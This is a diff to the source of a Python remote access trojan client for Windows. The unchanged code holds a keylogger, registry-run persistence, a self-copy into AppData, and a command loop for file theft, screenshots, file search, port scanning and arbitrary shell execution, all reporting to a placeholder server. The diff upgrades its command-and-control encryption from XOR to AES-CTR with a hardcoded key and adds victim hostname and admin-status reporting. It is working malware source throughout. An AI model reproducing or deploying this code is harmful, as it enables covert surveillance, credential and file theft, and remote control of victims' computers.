@@ -11,6 +11,9 @@ from time import sleep
 from pythoncom import PumpMessages
 from pyWinhook import HookManager
 from threading import Thread
+from ctypes import windll
+from Crypto.Cipher import AES
+from Crypto.Util import Counter
 
 class Keylogger(Thread):
     ''' Thread for incommig dns requests '''
@@ -52,7 +55,8 @@ class Client:
     def __init__(self):
         self.SERVER_IP = '<SERVER-IP-ADDRESS>'
         self.SERVER_PORT = 8080
-        self.key = 'E5c(;7=>-u%9Zd0IT!dbYJ3&(j~q=FBt.%;bh1<EH5|/-[;=HqsRNgM%|O,T{vX9->Nds8n4?H?I~S9kzzqOln4Xn%fQt4aI:0xJmG1#FG{20YHZ.-ZfeAGh&qH:]RtC^KUo#(aJ1[zFJErWRz}Vmw%~W^${X75t$P7jf(}ZtBD}D:IoXjv/_X|T|WjJhGpc0Y^2LGMj|w_xBHK3xFus5lwFHllS0XpUZtpo9^^<Ps%aGsL2L-dL[$[7x$j_%1jy!bj2P[Q:mhVwP_N}){x7Lc?G$qe4WN!}+9xSP{(}<e}14Z-i5Vm}^;UJ.LC]Q62.|n.&,P#!%PUWg,B!9H8LYK0KanpLk<s?!5{[y.C^WtX.ChDVrnTbYZ4ub5v-D}W]4#%A28YQbSQF.[LwUx>Iw!mK;cm1U$p-6>Ewrs?U)z[p8uAtYvH0%FuYz9<]bbc=teDUcgOaOc6g4Q,ry^4;oc3I0Z?:19](CLU/rJ{_8B2Th6mtz/J1_4,yiko3V0eqT2HANzyJ!0Ug&YET~%0qN_c~F=?W[mP-6r>&X9aqS#R-eS4mw_Y!>&L.uniEn!}7z.}[h8GiNtGj:>.0{R?]Nf7r[5+pfI?FcU0#^w$F~t]+:#Q~+4^wdMq96PE!d^R#k)V/w^i^.AZ&~S|63KS{4R)62$>8Yz2HmmV;6G&8h(S6Tf{PbAsjtieOX:Po%+Xr+b],p7lrBFpfKksX^LUV}ryx,-s5r6D]}25Tl5A-E4+WUKS=vp7l0:qnx88W:KrtAlY){^Bo.03,48ZAqST]2h6v{/Bh=V=vOi)71U9aX6hL</]0ioG0;)h}!#tzfmM?vV+_!c4uFeC;uNFNMAuQ;)>}luze!.It&]!n-zMoZ2z&=?aO=b>Xd[mBn+1w%Q>po_lCJ-+V;O9v_.gL}0gH:CT6|ZW/6u<:JIBZ!Cr53H!Eqc)BCeD;-}i}0+K{OTRS8e1ffy#Y8czMo9c;O/W7Kk(:i}UI5%>.0QIq,[Qv,&^McoP8KXwUm6TC}exdR8Ac'
+        self.USERNAME = self.get_username()
+        self.key = b';6\xbd\x87\x91\x04\x8e%\xca\xf2s\x7f\x13\xaa\xe6a\xc3\x13\xe0\t\x060\xe1U\xbe\xf2\x9e\xf6\x18\xdc\x9b8'
         # Persistence I: copy script to random appdata location
         self.APPDATA_PATH = f"{os.environ['APPDATA']}/Microsoft/Windows/Templates/tmp.py"
         self.PATH = os.path.realpath(__file__)
@@ -62,11 +66,33 @@ class Client:
         # Start Keylogger
         k = Keylogger()
         k.start()
+        
+    def get_username(self):
+        username = socket.gethostname() 
+        if windll.shell32.IsUserAnAdmin():
+            username += '@Admin'
+        else:
+            username += '@User'
+        return username
 
     def str_xor(self, s1, s2):
         ''' Encrypt/Decrypt function '''
         return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])
     
+    def encrypt(self, message):
+        ''' AES encrypt algorithm using CTR mode, takes bytes variable '''
+        iv = os.urandom(16)
+        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
+        encrypto = AES.new(self.key, AES.MODE_CTR, counter= ctr)
+        return iv + encrypto.encrypt(message)
+
+    def decrypt(self, message):
+        ''' AES decrypt algorithm using CTR mode, takes bytes variable '''
+        iv = message[:16]
+        ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
+        decrypto = AES.new(self.key, AES.MODE_CTR, counter=ctr)
+        return decrypto.decrypt(message[16:])
+
     def addRegkey(self):
         ''' Add Registry Key '''
         key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
@@ -95,7 +121,7 @@ class Client:
             except Exception as e:
                 pass
         # send results to server
-        s.send(self.str_xor(scan_result, self.key).encode()) 
+        s.send(self.encrypt(scan_result.encode()))
 
     def transfer(self, s, path):
         ''' send transfer file '''
@@ -105,21 +131,22 @@ class Client:
             while packet != b'':
                 s.send(packet) 
                 packet = f.read(1024)
-            s.send(self.str_xor('DONE', self.key).encode())
+            s.send(self.encrypt('DONE'.encode()))
             f.close()
         else: 
             # the file doesn't exist
-            s.send(self.str_xor('Unable to find out the file', self.key).encode())
+            s.send(self.encrypt('Unable to find out the file'.encode()))
 
     def connect(self): 
         ''' connect to server '''
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
         s.connect((self.SERVER_IP, self.SERVER_PORT)) # Here we define the server IP and the listening port
-
+        # send username
+        s.send(self.encrypt(self.USERNAME.encode()))
         # keep receiving commands from server
         while True: 
             # read the first KB of the tcp socket
-            command = self.str_xor(s.recv(1024).decode(), self.key)         
+            command = self.decrypt(s.recv(1024)).decode()         
             if 'terminate' in command:
                 # if we got terminate order from server, 
                 # close the socket and break the loop
@@ -131,16 +158,16 @@ class Client:
                 new_path = f"{cur_path}\\{directory}"
                 try: 
                     os.chdir(new_path)
-                    s.send(self.str_xor(f"[*] Current Path: {new_path}", self.key).encode())
+                    s.send(self.encrypt(f"[*] Current Path: {new_path}".encode()))
                 except Exception as e:
-                    s.send(self.str_xor(str(e), self.key).encode()) 
+                    s.send(self.encrypt(str(e).encode())) 
             elif 'grab' in command: 
                 # on grab, indicate for file transfer operation.
                 path = command.split()[-1]
                 try: 
                     self.transfer(s, path)
                 except Exception as e:
-                    s.send(self.str_xor(str(e), self.key).encode())
+                    s.send(self.encrypt(str(e).encode()))
             elif 'screenshoot' in command: 
                 # on screenshoot, take screen image and send it to server 
                 dirpath = mkdtemp()
@@ -149,7 +176,7 @@ class Client:
                     self.transfer(s, dirpath + "/screen.jpg")
                     rmtree(dirpath) 
                 except Exception as e:
-                    s.send(self.str_xor(str(e), self.key).encode())
+                    s.send(self.encrypt(str(e).encode()))
             elif 'search' in command: 
                 # cut off 'search' keyward, output would be C:\\*.pdf
                 command = command[7:] 
@@ -162,7 +189,7 @@ class Client:
                         if f.endswith(ext):
                             file_list = file_list + '\n' + os.path.join(dirpath, f)
                 # Send search result to server
-                s.send(self.str_xor(file_list, self.key).encode())
+                s.send(self.encrypt(file_list.encode()))
             elif 'scan' in command: 
                 # syntax: scan 10.0.2.15:22,80
                 # cut off 'scan' keyward
@@ -172,8 +199,8 @@ class Client:
             else: 
                 # otherwise, we pass the received command to a shell process
                 cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                s.send(self.str_xor(cmd.stdout.read().decode(), self.key).encode()) # send back the result
-                s.send(self.str_xor(cmd.stdout.read().decode(), self.key).encode()) # send back the error -if any-, such as syntax error
+                s.send(self.encrypt(cmd.stdout.read().decode().encode())) # send back the result
+                s.send(self.encrypt(cmd.stdout.read().decode().encode())) # send back the error -if any-, such as syntax error
 
 def main():
     c = Client()
